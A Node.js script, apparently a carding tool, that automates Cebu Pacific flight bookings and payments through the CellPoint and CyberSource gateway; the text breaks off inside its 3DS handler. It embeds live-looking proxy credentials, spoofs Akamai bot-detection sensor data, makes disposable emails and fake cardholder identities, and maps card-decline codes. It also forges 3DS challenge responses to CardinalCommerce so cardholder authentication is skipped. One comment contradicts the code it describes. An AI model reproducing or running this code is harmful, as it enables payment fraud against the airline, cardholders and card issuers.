const { spawn } = require("node:child_process");
const { AsyncLocalStorage } = require("node:async_hooks");
const fs = require('node:fs');
const querystring = require('querystring');
const http = require('http');
const crypto = require("crypto");

// ── Abort context propagation ─────────────────────────────────
// Allows the abort signal to flow automatically through async
// call chains without changing every function signature.
const requestAbortContext = new AsyncLocalStorage();

/**
 * Run `fn` inside an abort-signal context.
 * Every utils.Request() call made within fn (or any function it
 * awaits) will automatically respect the signal.
 */
function runWithAbortSignal(signal, fn) {
    return requestAbortContext.run({ signal }, fn);
}


let proxy = 'http://pkg-private2-country-ww:w52hib4044hgjabt@core-eu.aura-solutions.io:8603';
let sensorSet = false;
let A = null;

function log(str) {
    console.log(`[*] ${str}`);
}
const extract = (str, start, end) => str.split(start)[1]?.split(end)[0] || '';
const build_query = (f, e = '>', s = ["'", "'"]) =>
  querystring.stringify(
    f.split(e).reduce((acc, o) => {
      const name = extract(o, `name=${s[0]}`, s[0]);
      const value = extract(o, `value=${s[1]}`, s[1]);
      if (name) acc[name] = value;
      return acc;
    }, {})
);
function session_to_json(str) {
    const result = {};
    // Match sessionStorage.setItem() with both single and double quotes
    str.replace(/sessionStorage\.setItem\((['"])([^'"]+)\1,\s*(['"])([\s\S]*?)\3\)/g, (_, _q1, key, _q2, value) => {
        // Unescape PHP json_encode's \/ (forward-slash escaping) since we extract raw text, not JS-evaluated values
        result[key] = value.replace(/\\\//g, '/');
        return '';
    });

    // Fallback: targeted extraction for encryptedAuthHash
    if (!result.encryptedAuthHash) {
        const authHashMatch = str.match(/encryptedAuthHash['"]\s*,\s*['"]([^'"]+)['"]/);
        if (authHashMatch?.[1]) {
            result.encryptedAuthHash = authHashMatch[1];
        }
    }
    
    // ✅ FIX: Normalize additionaldata types
    if (result.additionaldata) {
        try {
            const addData = JSON.parse(result.additionaldata);
            if (addData.additional_data?.param) {
                addData.additional_data.param.forEach(p => {
                    // Force all text values to be strings
                    if (p.text !== undefined && typeof p.text !== 'string') {
                        p.text = String(p.text);
                    }
                });
                result.additionaldata = JSON.stringify(addData);
            }
        } catch (e) {
            console.error('[ERROR] Failed to normalize additionaldata:', e);
        }
    }
    
    return result;
}
function addslashes(str = '') {
  return str
    .replace(/\\/g, '\\\\') 
    .replace(/"/g, '\\"')   
    .replace(/'/g, "\\'");
}
function names() {
    const data = fs.readFileSync('names.txt', 'utf-8')
        .split('\n')
        .filter(line => line.trim() !== '');
    const randomIndex = Math.floor(Math.random() * data.length);
    return data[randomIndex];
}
function randomString(length = 6) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
}
function randomCity() {
    const cities = ['Manila','Cebu','Davao','Iloilo','Baguio','Quezon City','Makati','Pasig','Taguig','Pasay','Mandaluyong','Caloocan','Las Pinas','Parañaque','Muntinlupa','Bacolod','Cagayan de Oro','General Santos','Zamboanga','Puerto Princesa'];
    return cities[Math.floor(Math.random() * cities.length)];
}
function fetchSensor() {
    return new Promise((resolve, reject) => {
        http.get('http://localhost:5000/akamai.php', res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
            try {
            const json = JSON.parse(body);
            resolve({
                sensor: json.sensor,
                androidVersion: json.androidVersion,
                model: json.model
            });
            } catch (e) {
            reject(e);
            }
        });
        }).on('error', reject);
    });
}
function setHeader(arr, key, value) {
    const index = arr.findIndex(h => h.toLowerCase().startsWith(key.toLowerCase() + ":"));
    const header = `${key}: ${value}`;

    if (index >= 0) arr[index] = header;   // replace existing
    else arr.push(header);                 // add new
}
async function generateEmail(proxy) {
    try {

        const revenueCatId = "$RCAnonymousID:" + crypto.randomBytes(16).toString("hex");

        // headers formatted the SAME WAY you use for cebpac
        const headers = [
            "User-Agent: okhttp/4.11.0",
            "Content-Type: application/json",
            "Accept: application/json",
            "X-Revenuecat-App-User-Id: " + revenueCatId
        ];

        const postBody = JSON.stringify({
            ids: [2, 3, 8] // default Emailnator email types
        });
        const res = await Request(
            "https://api.emailnator.com/api/email/generate",
            {
                proxy: proxy,
                postfields: postBody,
                httpheader: headers
            }
        );
        
        const json = JSON.parse(res.response);

        if (
            json.status === "success" &&
            json.email
        ) {
            return json.email || null;
        }

        return null;

    } catch (e) {
        console.error("Emailnator error:", e.message);
        return null;
    }
}

async function Request(url, optsArray = {}) {
    // Pick up the abort signal from the async context (if any)
    const abortSignal = requestAbortContext.getStore()?.signal ?? null;

    // If already aborted, bail out immediately
    if (abortSignal?.aborted) return null;

    let result;
    let tries = 0;
    let continueTries = 0;
    let retry429 = 0;
    const MAX_RETRIES = 10;
    const MAX_429_RETRIES = 10;

    if (!optsArray.httpheader) optsArray.httpheader = [];

    while (continueTries < MAX_RETRIES) {
        // Check abort before every retry
        if (abortSignal?.aborted) return null;

        tries++;    

        if (!sensorSet || tries === 3) {
            sensorSet = true;
            tries = 1;
            A = await fetchSensor();
        }

        // Check abort after potentially-long sensor fetch
        if (abortSignal?.aborted) return null;

        setHeader(optsArray.httpheader, "X-Acf-Sensor-Data", A.sensor);
        setHeader(
            optsArray.httpheader,
            "User-Agent",
            `Cebu Pacific/3.82.1 (com.inkglobal.cebu.android; build:4172469; Android ${A.androidVersion}; Model:${A.model}) okhttp/4.12.0`
        );

        const sent = Buffer.from(JSON.stringify(optsArray)).toString("base64");
        const args = ["requestor.php", url, sent];

        result = await new Promise((resolve) => {
            const php = spawn("php", args);
            let stdout = "";

            php.stdout.on("data", d => stdout += d.toString());
            php.stderr.on("data", () => {});

            php.on("close", (code) => {
                resolve(code === 0 ? stdout.trim() : "");
            });

            // Kill the PHP process immediately when the abort signal fires
            if (abortSignal) {
                const onAbort = () => {
                    php.kill('SIGTERM');
                    resolve('');
                };
                // Register the listener first to avoid a race condition where the
                // signal is aborted between entering this block and listener registration.
                abortSignal.addEventListener('abort', onAbort, { once: true });
                // Remove the listener when the process closes naturally (no abort needed)
                php.on('close', () => abortSignal.removeEventListener('abort', onAbort));
                // If the signal was already aborted before we registered the listener,
                // remove the now-unnecessary listener and trigger the handler directly.
                if (abortSignal.aborted) {
                    abortSignal.removeEventListener('abort', onAbort);
                    onAbort();
                }
            }
        });

        // Check abort after the PHP process finishes
        if (abortSignal?.aborted) return null;

        if (!result) {
            continueTries++;
            continue;
        }

        let parsed;
        try { parsed = JSON.parse(result); }
        catch {
            continueTries++;
            continue;
        }

        const logMessage = `${url} [${parsed.http_code}]`;

        // ========================
        // 400 DEBUG LOGGING
        // ========================
if (parsed.http_code === 400) {
    console.log('\n' + '='.repeat(100));
    console.log('❌ HTTP 400 BAD REQUEST DETECTED');
    console.log('='.repeat(100));
    console.log('URL:', url);
    console.log('HTTP Code:', parsed.http_code);

    console.log('\n--- REQUEST HEADERS ---');
    optsArray.httpheader?.forEach(h => console.log('  ', h));

    console.log('\n--- REQUEST BODY ---');
    if (optsArray.postfields) {
        try {
            console.log(JSON.stringify(JSON.parse(optsArray.postfields), null, 2));
        } catch {
            console.log(optsArray.postfields);
        }
    }

    console.log('\n--- RESPONSE BODY ---');
    console.log(parsed.response || '(empty)');

    console.log('\n--- RESPONSE HEADERS ---');
    if (parsed.headers) {
        console.log(JSON.stringify(parsed.headers, null, 2));
    }

    console.log('='.repeat(100) + '\n');

    // ========================
    // ✅ FATAL BOOKING ERRORS - ABORT IMMEDIATELY, NO RETRY
    // ========================
    let responseStr = '';
    let responseObj = null;

    // Try to parse response as JSON first
    if (typeof parsed.response === 'string') {
        responseStr = parsed.response;
        try {
            responseObj = JSON.parse(parsed.response);
        } catch {
            // Not JSON, keep as string
        }
    } else if (parsed.response && typeof parsed.response === 'object') {
        responseObj = parsed.response;
        responseStr = JSON.stringify(parsed.response);
    }

    // ✅ CHECK 1: API Fault Object (structured error response)
    if (responseObj && responseObj.fault) {
        const faultString = responseObj.fault.faultstring || '';
        const errorCode = responseObj.fault.detail?.errorcode || '';

        if (faultString.includes("balance due must be greater than 0") || errorCode === "InvalidBalanceDue") {
            console.error('❌ FATAL: Booking already paid - aborting immediately (no retry)');
            parsed.fatal = true;
            parsed.fatalReason = "BOOKING_ALREADY_PAID";
            parsed.fault = responseObj.fault;  // Preserve fault object
            return parsed;
        }

        if (faultString.includes("not found") || faultString.includes("NoBookingInState")) {
            console.error('❌ FATAL: No booking found in state - aborting immediately (no retry)');
            parsed.fatal = true;
            parsed.fatalReason = "NO_BOOKING_IN_STATE";
            parsed.fault = responseObj.fault;
            return parsed;
        }

        // Other fault errors are also fatal
        console.error(`❌ FATAL: API Fault - ${faultString} (Code: ${errorCode})`);
        parsed.fatal = true;
        parsed.fatalReason = `API_FAULT_${errorCode || 'UNKNOWN'}`;
        parsed.fault = responseObj.fault;
        return parsed;
    }

    // ✅ CHECK 2: String-based error patterns (fallback)
    if (responseStr.includes("nsk:Booking:NoBookingInState")) {
        console.error('❌ FATAL: No booking found in state - aborting immediately (no retry)');
        parsed.fatal = true;
        parsed.fatalReason = "NO_BOOKING_IN_STATE";
        return parsed;
    }

    if (responseStr.includes("Booking balance due must be greater than 0")) {
        console.error('❌ FATAL: Booking already paid - aborting immediately (no retry)');
        parsed.fatal = true;
        parsed.fatalReason = "BOOKING_ALREADY_PAID";
        return parsed;
    }

    if (responseStr.includes("No payload") || responseStr.includes("no payload")) {
        console.error('❌ FATAL: No payload received - aborting immediately (no retry)');
        parsed.fatal = true;
        parsed.fatalReason = "NO_PAYLOAD";
        return parsed;
    }

    // ✅ CHECK 3: Empty or invalid response body
    if (!parsed.response || parsed.response.trim?.() === '') {
        console.error('❌ FATAL: Empty response body - aborting immediately (no retry)');
        parsed.fatal = true;
        parsed.fatalReason = "EMPTY_RESPONSE";
        return parsed;
    }

    // Non-fatal 400 error - will fall through to retry logic below
    console.warn('⚠️ Non-fatal HTTP 400 - will retry');

} else {
    log(logMessage);
}

// ========================
// HANDLE HTTP 429
// ========================
if (parsed.http_code === 429) {
    retry429++;

    if (retry429 >= MAX_429_RETRIES) {
        console.error(`❌ HTTP 429 retry limit reached (${MAX_429_RETRIES})`);
        return null;
    }

    console.warn(`⚠️ 429 Too Many Requests (retry ${retry429}/${MAX_429_RETRIES})`);
    await new Promise(r => setTimeout(r, 2000 + retry429 * 500));
    continue;
}

// ========================
// RETRY CONDITIONS (non-fatal errors)
// ========================
if (
    (parsed.http_code == 400 && !parsed.fatal) ||  // ✅ Only retry non-fatal 400s
    parsed.http_code == 0 ||
    parsed.http_code == 403 ||
    parsed.http_code == 421 ||
    parsed.proxy_error === true ||
    parsed.errno === 92
) {
    continueTries++;
    
    if (continueTries >= MAX_RETRIES) {
        console.error(`❌ Max retries (${MAX_RETRIES}) reached for ${url}`);
        return null;
    }
    
    console.warn(`⚠️ Retrying... (attempt ${continueTries}/${MAX_RETRIES})`);
    continue;
}

// ✅ If we get here with a fatal error, don't retry
if (parsed.fatal) {
    console.error(`❌ Fatal error detected, stopping retries: ${parsed.fatalReason}`);
    return parsed;
}

return parsed;
    }

    console.error(`❌ Max retries (${MAX_RETRIES}) reached for ${url}`);
    return null;
}
function errorMessage(sub_code) {
    const subCodes = {
        '2010101': 'The amount is invalid.',
        '2010000': 'Unknown error',
        '2010102': 'Card number is invalid.',
        '2010103': 'Installment field value is invalid.',
        '2010104': 'Invalid order number value',
        '2010105': 'Missing mandatory fields or data is not present',
        '2010106': 'Invalid MerchantId',
        '2010107': 'Invalid TransactionId',
        '2010108': 'Invalid transaction date',
        '2010109': 'Invalid CVC or CVN',
        '2010110': 'Invalid payment type',
        '2010111': 'Invalid expiry date',
        '2010112': 'Invalid 3DS secure values',
        '2010113': 'Invalid card type',
        '2010114': 'Invalid request version',
        '2010115': 'Return URL is not set.',
        '2010116': 'Invalid currency code.',
        '2010117': 'Invalid promotion.',
        '2010118': 'Invalid token.',
        '2010201': 'Invalid access credentials',
        '2010202': 'Invalid PIN or OTP',
        '2010203': 'Insufficient funds or over credit limit',
        '2010204': 'Expired card',
        '2010205': 'Unable to authorize',
        '2010206': 'Exceeds withdrawal count limit OR authentication requested',
        '2010207': 'Do not honor',
        '2010208': 'Transaction not permitted to user',
        '2010301': 'Internal error / general system error',
        '2010302': 'Parse error / invalid Request',
        '2010303': 'Service not available.',
        '2010304': 'Time out',
        '2010305': 'Payment is cancelled / Payment reversed',
        '2010306': 'Waiting for upstream response',
        '2010307': 'No routing available',
        '2010308': 'System DB error',
        '2010309': 'Invalid operation / operation rejected',
        '2010310': 'Transaction already in progress / duplicate transaction / duplicate order number',
        '2010311': 'Endpoint not supported',
        '2010312': 'Transaction not permitted to terminal',
        '2010313': 'Invalid merchant account / configuration / API permission missing',
        '2010314': 'Transaction rejected by issuer / authorization failed / transaction failed',
        '2010315': 'EMI not available',
        '2010316': 'Void not supported',
        '2010317': 'Already captured',
        '2010318': 'Retry limit exceeded',
        '2010319': 'Invalid capture attempted / capture amount exceeds approved amount',
        '2010320': 'Transaction not posted',
        '2010321': 'Recurring payment not supported',
        '2010322': 'Stored card option is disabled.',
        '2010323': 'Request authentication failed.',
        '2010324': 'Unable to decrypt request.',
        '2010325': 'Transaction ID / EP generation failed',
        '2010326': 'Installment payment is disabled.',
        '2010327': 'Ticket issue failed',
        '2010328': 'Sign-in failed',
        '2010329': 'Card type is not allowed.',
        '2010330': 'Issuing bank unavailable.',
        '2010331': 'Transaction exceeds the approved limit',
        '2010332': 'Cannot void as capture or credit is submitted',
        '2010333': 'Cannot refund as you requested a credit for a capture that was previously voided.',
        '2010334': 'Credit amount exceeds maximum allowed for your merchant account.',
        '2010401': 'FRAUD Suspicion / Rejected',
        '2010402': 'Address verification failed',
        '2010403': 'Card acceptor should contact acquirer / Issuing bank has questions about the request',
        '2010404': 'Security violation',
        '2010405': 'Card is blocked due to fraud',
        '2010406': '3D secure authentication failed',
        '2010407': 'Fraud, stolen or lost card',
        '2010408': 'Compliance ERROR',
        '2010409': 'Transaction previously declined',
        '2010410': 'E-commerce declined',
        '2010411': 'Card restricted',
        '2010412': 'Card function not supported',
        '2010413': 'Physical card error',
        '2010414': 'BIN check failed',
        '2010415': 'Validation check failed.',
        '2010416': 'CVN did not match',
        '2010417': 'The customer matched an entry on the processor’s negative file.',
        '2010418': 'Strong customer authentication (SCA) is required for this transaction.',
        '2010419': 'Authorization request was approved by the issuing bank but declined by gateway or processor.',
        '2016000': '3D Verification Failed'
    };

    return subCodes[sub_code] || "Unknown sub_code";
}
async function completePayment1(transaction, session, securedData, location, st, ct, phone, mm, yyyy, Bearer, Xauth, currency) {
    let A, B, C, D;

    // Use a consistent randomized browser UA for all requests in this payment completion.
    const completionUA = generateBrowserUA();
    
    // ========================================
    // BUILD PAYMENTCOMPLETE PAYLOAD (EXACT BROWSER ORDER)
    // ========================================
    const paymentCompletePayload = {
        transactionId: transaction.id,
        clientId: "10077",
        pollingTimeout: "30",
        minPollingInterval: "1",
        maxPollingInterval: "10"
    };
    
    // Add secured_data fields (txn_hash and session_hash)
    if (securedData && typeof securedData === 'object') {
        Object.assign(paymentCompletePayload, securedData);
    }
    
    // Add remaining fields in browser order
    paymentCompletePayload.secure = "false";
    paymentCompletePayload.token = session.timetoken;
    paymentCompletePayload.sessiontime = "13";
    
    const json = JSON.stringify(paymentCompletePayload);
    
    console.log('[*] ============================================');
    console.log('[*] 3DS PAYMENT COMPLETE REQUEST');
    console.log('[*] ============================================');
    console.log('[*] Payload:', json);
    console.log('[*] Referer:', location);

    const paymentCompleteResponse = await Request("https://pop.cellpointdigital.net/api/paymentcomplete", {
        proxy: proxy,
        postfields: json,
        httpheader: [
            "Content-Type: application/json",
            `Referer: ${location}`,
            `User-Agent: ${completionUA}`,
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            "Origin: https://pop.cellpointdigital.net",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
        ]
    });

    console.log('[*] ============================================');
    console.log('[*] FULL PAYMENTCOMPLETE RAW RESPONSE (3DS):');
    console.log('[*] HTTP Code:', paymentCompleteResponse.http_code);
    console.log('[*] Response Body:', paymentCompleteResponse.response);
    console.log('[*] Response Length:', paymentCompleteResponse.response ? paymentCompleteResponse.response.length : 0);
    console.log('[*] ============================================');
    
    if (!paymentCompleteResponse.response || paymentCompleteResponse.response.trim() === '') {
        console.error('[ERROR] Empty response from paymentcomplete');
        return {
            error: 'Empty response from payment gateway',
            fraud_status_desc: 'Error',
            payment_status: 'Failed',
            fraud_status_code: 'EMPTY_RESPONSE'
        };
    }
    
    try {
        A = JSON.parse(paymentCompleteResponse.response);
    } catch (e) {
        console.error('[ERROR] Failed to parse paymentcomplete response');
        return {
            error: 'Invalid JSON from payment gateway',
            fraud_status_desc: 'Error',
            payment_status: 'Failed',
            fraud_status_code: 'PARSE_ERROR'
        };
    }
    
    console.log('[*] Parsed Payment Complete Response:', JSON.stringify(A, null, 2));
    
    // ✅ Check fraud rejection FIRST
    if (A.fraud_status_desc === 'Rejected') {
        console.log('[WARN] Payment rejected by fraud system');
        return {
            fraud_status_desc: A.fraud_status_desc,
            fraud_status_code: A.fraud_status_code,
            payment_status: 'Failed',
            approval_code: A.approval_code,
            psp_ref_id: A.psp_ref_id
        };
    }
    
    // ✅ Check payment status
    if (A.payment_status !== 'Complete') {
        console.log('[WARN] Payment not complete. Status:', A.payment_status);
        return {
            fraud_status_desc: A.fraud_status_desc || 'Payment not completed',
            fraud_status_code: A.fraud_status_code,
            payment_status: A.payment_status || 'Unknown',
            status_code: A.status_code,
            approval_code: A.approval_code,
            message: A.message,
            psp_ref_id: A.psp_ref_id
        };
    }
    
    console.log('[*] Payment status is Complete, proceeding with sessioncomplete...');
    
    // ========================================
    // BUILD SESSIONCOMPLETE PAYLOAD (EXACT BROWSER ORDER)
    // ========================================
    const sessionCompletePayload = {
        transactionId: transaction.id,
        clientId: session.clientid,
        pollingTimeout: "30",
        minPollingInterval: "1",
        maxPollingInterval: "10"
    };
    
    // Add secured_data fields (txn_hash and session_hash)
    if (securedData && typeof securedData === 'object') {
        Object.assign(sessionCompletePayload, securedData);
    }
    
    // Add remaining fields in EXACT browser order
    sessionCompletePayload.sessionId = A.session_id;
    sessionCompletePayload.mode = "1";
    sessionCompletePayload.secure = "false";
    sessionCompletePayload.statusCode = A.status_code;
    sessionCompletePayload.token = session.timetoken;
    sessionCompletePayload.sessiontime = "13";
    
    B = await Request("https://pop.cellpointdigital.net/api/sessioncomplete", {
        proxy: proxy,
        postfields: JSON.stringify(sessionCompletePayload),
        httpheader: [
            "Content-Type: application/json",
            `Referer: ${location}`,
            `User-Agent: ${completionUA}`,
            "Accept: application/json, text/plain, */*",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            "Origin: https://pop.cellpointdigital.net",
            "Sec-Fetch-Dest: empty",
            "Sec-Fetch-Mode: cors",
            "Sec-Fetch-Site: same-origin",
        ]
    });
    
    console.log('[*] Session complete response:', B.http_code);
    
    // ========================================
    // FINAL CALLBACK POST
    // ========================================
    const params = new URLSearchParams({
        transaction_id: A.transaction_id,
        transaction_status: "1",
        order_id: A.order_id,
        amount: A.amount,
        state_id: A.state_id || '2001',
        sign: A.sign,
        session_id: A.session_id,
        currency: currency || '608',
        decimals: "2",
        payment_method: "Card",
        card_name: A.card_name,
        masked_card: A.masked_card,
        approval_code: A.approval_code,
        psp_name: "CyberSource",
        fraud_status_code: A.fraud_status_code,
        fraud_status_desc: A.fraud_status_desc,
        expiration_date: `${mm}/${String(yyyy).slice(2, 4)}`,
        first_name: names(),
        last_name: names(),
        street_address: st || '123 Main St',
        city: ct || 'Manila',
        country: "Philippines",
        country_alpha2code: "PH",
        province: "Agusan del Norte",
        postal_code: Math.floor(Math.random() * 10000),
        email: session.customerref,
        mobile_number: phone,
        dialing_country_code: "63",
        psp_ref_id: A.psp_ref_id,
        date_time: A.date_time,
        ip_address: A.ip_address
    });
    
    if (A.additional_data && typeof A.additional_data === "object") {
        for (const [key, value] of Object.entries(A.additional_data)) {
            params.append(key, value);
        }
    }
    
    const finalString = params.toString();
    
    console.log('[*] Posting to redirect URL:', A.url);
    C = (await Request(A.url, {
        followlocation: true,
        proxy: proxy,
        postfields: finalString,
        httpheader: [
            'Content-Type: application/x-www-form-urlencoded',
            `User-Agent: ${completionUA}`,
            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language: en-US,en;q=0.9",
            "Accept-Encoding: gzip, deflate, br",
            'Origin: https://pop.cellpointdigital.net',
            'Referer: https://pop.cellpointdigital.net/',
            "Sec-Fetch-Dest: document",
            "Sec-Fetch-Mode: navigate",
            "Sec-Fetch-Site: cross-site",
            "Upgrade-Insecure-Requests: 1",
        ]
    })).response;
    
    // ========================================
    // GET ITINERARY (BOOKING CONFIRMATION)
    // ========================================
    console.log('[*] Fetching itinerary...');
    
    try {
        D = JSON.parse((await Request('https://soar.cebupacificair.com/ceb-omnix-proxy-v3/itinerary', {
            httpheader: [
                'X-Auth-Token: ' + Xauth,
                'Authorization: Bearer ' + Bearer,
                'Referer: https://www.cebupacificair.com',
                'Origin: https://www.cebupacificair.com',
            ]
        })).response);
        
        console.log('[*] Itinerary fetched successfully. Record:', D.recordLocator);
    } catch (e) {
        console.error('[ERROR] Failed to fetch itinerary:', e.message);
        D = { recordLocator: 'N/A' };
    }

    // ========================================
    // RETURN RESULT WITH ALL AVAILABLE DATA
    // ========================================
    const finalResult = {
        payment_status: A.payment_status,
        fraud_status_desc: A.fraud_status_desc,
        fraud_status_code: A.fraud_status_code,
        record: D.recordLocator,
        email: session.customerref,
        ip_address: A.ip_address,
        approval_code: A.approval_code,
        masked_card: A.masked_card,
        psp_ref_id: A.psp_ref_id
    };
    
    console.log('[*] ============================================');
    console.log('[*] FINAL PAYMENT RESULT:');
    console.log('[*]', JSON.stringify(finalResult, null, 2));
    console.log('[*] ============================================');
    
    return finalResult;
}
//     return JSON.stringify({
//         fraud_status_desc: A.fraud_status_desc,
//     });
// }
// async function completePayment(transaction, token, securedData, location, Bearer, Xauth) {
//     let A, B, Approval;
//     const json = JSON.stringify({
//         transactionId: transaction.id,
//         clientId: "10077",
//         pollingTimeout: "30",
//         minPollingInterval: "1",
//         maxPollingInterval: "10",
//         secure: false,
//         token,
//         sessiontime: "13",
//         ...securedData
//     });

//     A = JSON.parse((await Request("https://pop.cellpointdigital.net/api/paymentcomplete", {
//         postfields: json,
//         httpheader: [
//             "Content-Type: application/json",
//             `Referer: ${location}`,
//             "Origin: https://pop.cellpointdigital.net"
//         ]
//     })).response);
//     console.log(A);
//     if (A.fraud_status_desc != 'Rejected') {
//     B = JSON.parse((await Request('https://soar.cebupacificair.com/ceb-omnix-proxy-v3/itinerary', {
//         httpheader: [
//             'X-Auth-Token: ' + Xauth,
//             'Authorization: Bearer ' + Bearer,
//             'Referer: https://www.cebupacificair.com',
//             'Origin: https://www.cebupacificair.com',
//         ]
//     })).response);

//     return {
//         fraud_status_desc: A.fraud_status_desc, record: B.recordLocator
//         }
//     }
//     return {
//         fraud_status_desc: A.fraud_status_desc
//     }
// }
// Generate a realistic desktop browser User-Agent for 3DS and payment page requests.
// Chrome (70 %) or Firefox (30 %), with modern version numbers current as of 2026.
function generateBrowserUA() {
    if (Math.random() < 0.7) {
        const v = Math.floor(Math.random() * 8) + 136; // Chrome 136-143
        const platforms = [
            `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`,
            `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${v}.0.0.0 Safari/537.36`,
        ];
        return platforms[Math.floor(Math.random() * platforms.length)];
    } else {
        const v = Math.floor(Math.random() * 6) + 130; // Firefox 130-135
        return `Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:${v}.0) Gecko/20100101 Firefox/${v}.0`;
    }
}

async function handle3DS(j, socket = null) {
    if (j.Code !== '2005') return j;

    function emitProgress(pct, message, extra = {}) {
        if (socket) socket.emit('paymentProgress', { pct, message, ...extra });
    }

    emitProgress(65, '3DS challenge in progress...');

    // Single consistent browser UA for the entire 3DS session
    const browserUA = generateBrowserUA();

    try {
        // Extract threeDsUrl and JWT from response body
        const threeDsUrl = extract(j.body, "action='", "'");
        const JWT = extract(j.body, "name='JWT' value='", "'");
        
        if (!threeDsUrl || !JWT) {
            console.error('[3DS] Failed to extract 3DS URL or JWT');
            return { error: 'Missing 3DS URL or JWT', body: j.body };
        }

        console.log('[3DS] Step 1: Posting JWT to StepUp...');
        
        // Step 1: POST JWT to get stepUp response.
        // Mimic a real browser navigating from the payment page to the 3DS challenge URL.
        const stepUp = await Request(threeDsUrl, {
            proxy: proxy,
            postfields: `JWT=${JWT}`,
            httpheader: [
                "Content-Type: application/x-www-form-urlencoded",
                `User-Agent: ${browserUA}`,
            ]
        });

        // Check if stepUp contains acsUrl
        if (!stepUp || !stepUp.response) {
            console.error('[3DS] StepUp request failed (null or empty response)');
            return { error: 'StepUp request failed', response: null };
        }
        if (!stepUp.response.includes('acsUrl')) {
            console.error('[3DS] No acsUrl found in stepUp response');
            return { error: 'No acsUrl in StepUp', response: stepUp.response };
        }

        console.log('[3DS] Step 2: Extracting ACS parameters...');

        // Extract values from StepUp response
        const acsUrl = extract(stepUp.response, 'name="acsUrl" value="', '"');
        // Derive the origin of the ACS challenge page for use as Referer/Origin in subsequent steps
        let acsOrigin = 'https://centinelapi.cardinalcommerce.com';
        try { acsOrigin = new URL(acsUrl).origin; } catch (_) {
            console.warn('[3DS] Could not parse acsUrl for origin, using CardinalCommerce fallback:', acsUrl);
        }
        const jwt_payload = extract(stepUp.response, 'name="payload" value="', '"');
        const mcsId = extract(stepUp.response, 'name="mcsId" value="', '"'); // Base64 encoded - for CCA
        const McsId = extract(stepUp.response, 'name="McsId" id="redirect-mcsId" value="', '"'); // Decoded format - for TermRedirection

        let finalMcsId = McsId;
        if (!finalMcsId && mcsId) {
            // Decode base64 mcsId to get the proper format
            try {
                finalMcsId = Buffer.from(mcsId, 'base64').toString('utf-8');
                console.log('[3DS] McsId not found in response, decoded from mcsId:', finalMcsId);
            } catch (e) {
                console.error('[3DS] Failed to decode mcsId:', e);
            }
        }

        if (!jwt_payload || !mcsId) { // ← REMOVE McsId check since we can decode it
            console.error('[3DS] Failed to extract required 3DS parameters');
            return { error: 'Missing 3DS parameters', response: stepUp.response };
        }

        console.log('[3DS] Step 3: Decoding JWT payload...');

        // Decode the JWT payload to get transaction IDs
        let remove_message;
        try {
            remove_message = JSON.parse(Buffer.from(jwt_payload, 'base64').toString('utf-8'));
        } catch (e) {
            console.error('[3DS] Failed to decode JWT payload:', e);
            return { error: 'JWT decode failed', response: stepUp.response };
        }

        console.log('[3DS] Step 4: Building CRes payload...');

        // Create CRes with success status (transStatus: Y)
        const cresPayload = {
            threeDSServerTransID: remove_message.threeDSServerTransID,
            acsTransID: remove_message.acsTransID,
            challengeCompletionInd: 'Y',
            messageType: 'CRes',
            messageVersion: remove_message.messageVersion || '2.2.0', 
            transStatus: 'N' 
        };

        const cresBase64 = Buffer.from(JSON.stringify(cresPayload)).toString('base64');

        console.log('[3DS] Step 5: Posting CRes to Cardinal CCA...');

        emitProgress(70, '3DS verification in progress...');

        // Step 2: POST CRes to CardinalCommerce CCA.
        // Mimic the browser posting back from the ACS challenge page to the Cardinal return URL.
        await Request('https://centinelapi.cardinalcommerce.com/V1/TermURL/2.0/CCA', {
            proxy: proxy,
            postfields: `cres=${cresBase64}&threeDSSessionData=${mcsId}`, // Use base64 mcsId
            httpheader: [
                "Content-Type: application/x-www-form-urlencoded",
                `User-Agent: ${browserUA}`,
            ]
        });

        console.log('[3DS] Step 6: Posting to TermRedirection...');

        // Step 3: POST to TermRedirection with DECODED McsId.
        // Mimic the browser staying within CardinalCommerce after CCA completes.
        const termRedirection = await Request('https://centinelapi.cardinalcommerce.com/V1/Cruise/TermRedirection', {
            proxy: proxy,
            postfields: `McsId=${finalMcsId}&CardinalJWT=&Error=`, // ← USE finalMcsId instead of McsId
            httpheader: [
                "Content-Type: application/x-www-form-urlencoded",
                `User-Agent: ${browserUA}`,
            ]
        });

        console.log('[3DS] Step 7: Extracting TransactionId...');

        if (!termRedirection || !termRedirection.response) {
            console.error('[3DS] TermRedirection request failed (null or empty response)');
            return { error: 'TermRedirection request failed', response: null };
        }

        // Extract TransactionId from TermRedirection response - try multiple methods
        let TransactionId = extract(termRedirection.response, 'name="TransactionId" value="', '"');
        
        // Try alternate extraction methods if first one fails
        if (!TransactionId) {
            TransactionId = extract(termRedirection.response, "name='TransactionId' value='", "'");
        }
        if (!TransactionId) {
            TransactionId = extract(termRedirection.response, 'TransactionId" value="', '"');
        }
        if (!TransactionId) {
            // Try regex pattern
            const match = termRedirection.response.match(/<input[^>]*name=["'\\]TransactionId["'\\][^>]*value=["'\\]([^"'\\]+)["'\\]/i);
            if (match && match[1]) {
                TransactionId = match[1];
            }
        }

        // If still empty, return error
        if (!TransactionId) {
            console.error('[3DS] Failed to extract TransactionId from TermRedirection');
            console.error('[3DS] TermRedirection response (first 500 chars):', termRedirection.response?.substring(0, 500));
            return { error: 'Failed to extract TransactionId', response: termRedirection.response };
        }

        console.log('[3DS] Step 8: Posting to CyberSource 3DS redirect...');
        console.log('[3DS] TransactionId:', TransactionId);

        // Step 4: POST to threed-redirect with extracted TransactionId.
        // Browser is redirected from CardinalCommerce back to the payment gateway's MPI endpoint.
        // ❌ CRITICAL: REMOVE followlocation to capture Location header
